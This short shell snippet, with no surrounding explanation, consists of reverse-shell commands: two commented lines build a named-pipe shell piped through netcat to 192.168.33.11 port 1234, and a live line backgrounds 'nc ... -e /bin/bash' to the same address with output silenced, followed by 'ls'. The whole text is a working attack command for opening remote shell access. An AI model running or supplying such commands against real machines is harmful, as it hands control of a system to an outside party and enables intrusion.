#rm -f /tmp/f; mkfifo /tmpf
#nohup cat /tmp/f | /bin/sh -i 2>&1 | nc 192.168.33.11 1234 > /tmp/f >/dev/null 2>&1 &

nohup nc 192.168.33.11 1234 -e /bin/bash >/dev/null 2>&1 &
ls
